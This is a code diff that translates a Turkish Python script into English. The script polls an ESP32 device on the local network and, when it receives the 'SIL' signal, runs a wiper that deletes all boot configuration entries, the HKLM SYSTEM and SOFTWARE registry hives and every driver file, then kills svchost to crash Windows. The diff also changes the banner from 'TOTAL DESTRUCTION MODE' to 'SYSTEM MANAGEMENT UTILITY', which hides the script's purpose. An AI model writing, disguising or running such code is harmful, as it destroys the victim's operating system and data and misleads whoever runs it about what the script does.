@@ -4,59 +4,59 @@ import time
 import ctypes
 
 # ============================================================
-# AYARLAR
+# SETTINGS
 # ============================================================
 ESP32_IP  = "192.168.1.253"
 ESP32_URL = f"http://{ESP32_IP}/durum"
 
-def tam_imha():
-    print("\n[!!!] SİNYAL ALINDI! TAM İMHA BAŞLATILIYOR...")
+def total_destruction():
+    print("\n[!!!] SIGNAL RECEIVED! STARTING TOTAL DESTRUCTION...")
     
-    # 1. Önyükleme Kaydını (BCD) Sil - Bilgisayar bir daha asla Windows'u bulamaz.
-    print("[*] Boot verileri siliniyor...")
+    # 1. Delete Boot Data (BCD) - Computer will never find Windows again.
+    print("[*] Removing boot data...")
     os.system("bcdedit /deleteall")
     
-    # 2. Kayıt Defterini (Registry) Parçala - Windows'un tüm ayarlarını yok eder.
-    print("[*] Kayıt defteri temizleniyor...")
+    # 2. Destroy Registry (Registry) - Wipes all Windows settings.
+    print("[*] Cleaning registry...")
     os.system(r'reg delete "HKEY_LOCAL_MACHINE\SYSTEM" /f')
     os.system(r'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE" /f')
     
-    # 3. Kritik Sürücüleri Sil - Donanım iletişimini keser.
-    print("[*] Sürücüler yok ediliyor...")
+    # 3. Delete Critical Drivers - Breaks hardware communication.
+    print("[*] Destroying drivers...")
     os.system(r"del /f /s /q C:\Windows\System32\drivers\*.sys")
 
-    # 4. Final: Mavi Ekranı Tetikle ve Sistemi Kapat
-    print("[*] Son darbe vuruluyor...")
-    # Kritik süreci sonlandırarak anında çökme sağlar
+    # 4. Final Strike: Trigger Blue Screen and Shutdown
+    print("[*] Delivering final blow...")
+    # Terminating critical process causes immediate crash
     os.system("taskkill /f /im svchost.exe")
 
 def main():
-    # Yönetici kontrolü (WinError 5 almamak için şart!)
+    # Admin check (required to avoid WinError 5!)
     if not ctypes.windll.shell32.IsUserAnAdmin():
         print("=" * 50)
-        print("[HATA] BU KODU LÜTFEN 'YÖNETİCİ OLARAK' ÇALIŞTIR!")
+        print("[ERROR] PLEASE RUN THIS CODE AS 'ADMINISTRATOR'!")
         print("=" * 50)
         return
 
     print("=" * 50)
-    print("      ESP32 DEMO: TOTAL DESTRUCTION MODE")
+    print("      ESP32-C6: SYSTEM MANAGEMENT UTILITY")
     print("=" * 50)
-    print(f"Hedef: {ESP32_URL}")
-    print("[HAZIR] ESP32'den 'SIL' komutu bekleniyor...")
+    print(f"Target: {ESP32_URL}")
+    print("[READY] Waiting for 'DELETE' command from ESP32...")
 
     while True:
         try:
             response = requests.get(ESP32_URL, timeout=2)
-            durum = response.text.strip().upper()
+            status = response.text.strip().upper()
 
-            if durum == "SIL":
-                tam_imha()
+            if status == "SIL":
+                total_destruction()
                 break
             else:
-                print(f"[...] Sinyal bekleniyor: '{durum}'", end="\r")
+                print(f"[...] Waiting for signal: '{status}'", end="\r")
 
         except Exception as e:
-            print(f"[!] Bağlantı hatası: {e}          ", end="\r")
+            print(f"[!] Connection error: {e}          ", end="\r")
 
         time.sleep(1)
 
